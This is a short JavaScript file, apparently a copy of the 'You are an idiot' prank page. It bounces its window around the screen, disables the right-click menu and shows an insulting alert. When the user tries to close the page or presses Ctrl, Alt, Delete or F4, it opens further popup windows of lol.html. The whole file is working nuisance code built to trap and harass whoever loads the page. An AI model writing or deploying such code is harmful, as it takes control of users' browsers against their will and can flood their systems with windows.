var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;

function changeTitle(title) {
    document.title = title;
}

function openWindow(url) {
    window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

function newXlt() {
    xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
}

function newXrt() {
    xOff = Math.ceil(7 * Math.random()) * 5 - 10;
    window.focus();
}

function newYup() {
    yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
}

function newYdn() {
    yOff = Math.ceil(7 * Math.random()) * 5 - 10;
    window.focus();
}

function fOff() {
    flagRun = 0;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;

    if (xPos > screen.width - 357) newXlt();
    if (xPos < 0) newXrt();

    if (yPos > screen.height - 330) newYup();
    if (yPos < 0) newYdn();

    if (flagRun === 1) {
        window.moveTo(xPos, yPos);
        setTimeout(playBall, 1);
    }
}

/* Improved logic */
window.onload = function () {
    flagRun = 1;
    playBall();
    return true;
};

window.onbeforeunload = function () {
    openWindow('lol.html'); // Open a new window when an attempt to close is made
    return "Are you sure you want to leave?";
};

/* Preventing unnecessary triggers */
window.oncontextmenu = function () {
    return false;
};

window.onkeydown = function (event) {
    var keyCode = event.keyCode;

    if (keyCode === 17 || keyCode === 18 || keyCode === 46 || keyCode === 115) {
        alert("You are an idiot!");
        openWindow('lol.html');
    }

    return null;
};
